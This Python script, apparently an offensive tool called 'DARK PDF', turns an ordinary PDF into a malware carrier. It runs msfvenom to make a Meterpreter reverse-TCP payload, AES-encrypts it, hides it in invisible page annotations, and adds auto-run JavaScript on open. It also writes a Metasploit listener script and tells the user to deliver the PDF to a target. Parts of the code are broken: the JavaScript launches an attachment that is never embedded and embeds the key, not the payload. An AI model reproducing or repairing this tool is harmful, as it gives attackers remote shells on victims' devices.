import os
import base64
import random
import string
import pypdf
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from pypdf.generic import NameObject, DictionaryObject, TextStringObject, NumberObject, ArrayObject, StreamObject

# 🎨 Colors for Better UX
RED, GREEN, YELLOW, RESET = '\033[91m', '\033[92m', '\033[93m', '\033[0m'

def banner():
    print(f"""{YELLOW}
    ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██╔════╝
    ██║  ██║███████║██████╔╝█████╔╝     ██████╔╝██║  ██║█████╗  
    ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔═══╝ ██║  ██║██╔══╝  
    ██████╔╝██║  ██║██║  ██║██║  ██╗    ██║     ██████╔╝██║     
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═════╝ ╚═╝{RESET}
    """)

def get_user_input():
    print(f"{GREEN}[+] Enter the required details:{RESET}")
    LHOST = input("Enter LHOST (your IP): ").strip()
    LPORT = input("Enter LPORT (e.g., 4444): ").strip()
    input_pdf = input("Enter the PDF file to bind with: ").strip()
    output_pdf = input("Enter the final output PDF name: ").strip()

    print("\n[1] Windows\n[2] MacOS\n[3] Android\n[4] iOS")
    choice = input("Select target OS: ").strip()

    payload_dict = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "osx/x64/meterpreter_reverse_tcp",
        "3": "android/meterpreter/reverse_tcp",
        "4": "osx/x64/meterpreter_reverse_tcp"  # iOS uses Mac payload
    }

    payload = payload_dict.get(choice, "windows/meterpreter/reverse_tcp")
    return LHOST, LPORT, input_pdf, output_pdf, payload, choice

def generate_payload(LHOST, LPORT, payload_type, os_choice):
    print(f"{YELLOW}[+] Generating payload for {payload_type}...{RESET}")
    ext = "exe" if os_choice == "1" else "apk" if os_choice == "3" else "macho"
    payload_file = ''.join(random.choices(string.ascii_letters, k=8)) + f".{ext}"

    os.system(f"msfvenom -p {payload_type} LHOST={LHOST} LPORT={LPORT} -f raw > {payload_file}")
    return payload_file

def obfuscate_payload(payload_file):
    print(f"{YELLOW}[+] Obfuscating payload...{RESET}")
    with open(payload_file, "rb") as f:
        payload_data = f.read()

    key = os.urandom(16)  # Generate a random AES key
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_payload = cipher.iv + cipher.encrypt(pad(payload_data, AES.block_size))

    encoded_payload = base64.b64encode(encrypted_payload).decode()
    os.remove(payload_file)

    return encoded_payload, key

def inject_payload_into_pdf(input_pdf, output_pdf, encoded_payload):
    print(f"{YELLOW}[+] Injecting payload into PDF metadata...{RESET}")

    pdf_reader = pypdf.PdfReader(input_pdf)
    pdf_writer = pypdf.PdfWriter()

    for page_num in range(len(pdf_reader.pages)):
        page = pdf_reader.pages[page_num]
        pdf_writer.add_page(page)

        annotation = DictionaryObject()
        annotation.update({
            NameObject("/Type"): NameObject("/Annot"),
            NameObject("/Subtype"): NameObject("/Text"),
            NameObject("/Rect"): ArrayObject([
                NumberObject(10), NumberObject(10), NumberObject(50), NumberObject(50)  # Invisible Box
            ]),
            NameObject("/Contents"): TextStringObject(encoded_payload),
            NameObject("/Open"): NameObject("false")
        })

        if "/Annots" in page:
            page[NameObject("/Annots")].append(annotation)
        else:
            page[NameObject("/Annots")] = ArrayObject([annotation])

    with open(output_pdf, "wb") as output_file:
        pdf_writer.write(output_file)

    print(f"{GREEN}[✔] Payload injected into PDF metadata successfully!{RESET}")

def generate_auto_execution_script(output_pdf, key):
    print(f"{YELLOW}[+] Creating auto-execution script...{RESET}")

    script_content = f"""
    var payload = '{base64.b64encode(key).decode()}';
    var decoded_payload = atob(payload);
    this.exportDataObject({{ cName: "payload.exe", nLaunch: 2 }});
    """

    pdf_reader = pypdf.PdfReader(output_pdf)
    pdf_writer = pypdf.PdfWriter()

    for page in pdf_reader.pages:
        pdf_writer.add_page(page)

    # Create JavaScript action
    js_object = StreamObject()
    js_object.update({
        NameObject("/JS"): TextStringObject(script_content),
        NameObject("/S"): NameObject("/JavaScript")
    })

    # Ensure JavaScript entry is added properly
    names_dict = DictionaryObject()
    names_dict.update({
        NameObject("/JavaScript"): DictionaryObject({
            NameObject("/Names"): ArrayObject([TextStringObject("EmbeddedJS"), js_object])
        })
    })

    pdf_writer._root_object.update({
        NameObject("/Names"): names_dict,
        NameObject("/OpenAction"): js_object  # Auto-execute on open
    })

    with open(output_pdf, "wb") as out_f:
        pdf_writer.write(out_f)

    print(f"{GREEN}[✔] Auto-execution enabled in {output_pdf}{RESET}")

def setup_metasploit(LHOST, LPORT, payload_type):
    print(f"{YELLOW}[+] Setting up Metasploit listener...{RESET}")
    msf_script = f"""
use exploit/multi/handler
set payload {payload_type}
set LHOST {LHOST}
set LPORT {LPORT}
exploit
"""
    with open("listener.rc", "w") as f:
        f.write(msf_script)

    print(f"{GREEN}[+] To start listener, run: msfconsole -r listener.rc{RESET}")

# 🚀 MAIN EXECUTION 🚀
if __name__ == "__main__":
    banner()
    LHOST, LPORT, input_pdf, output_pdf, payload_type, os_choice = get_user_input()
    
    payload_file = generate_payload(LHOST, LPORT, payload_type, os_choice)
    encoded_payload, key = obfuscate_payload(payload_file)
    
    inject_payload_into_pdf(input_pdf, output_pdf, encoded_payload)
    generate_auto_execution_script(output_pdf, key)

    setup_metasploit(LHOST, LPORT, payload_type)

    print(f"{GREEN}[✔] Payload successfully embedded into final_{output_pdf}!{RESET}")
    print(f"{GREEN}[✔] Start your Metasploit listener and deliver the PDF.{RESET}")
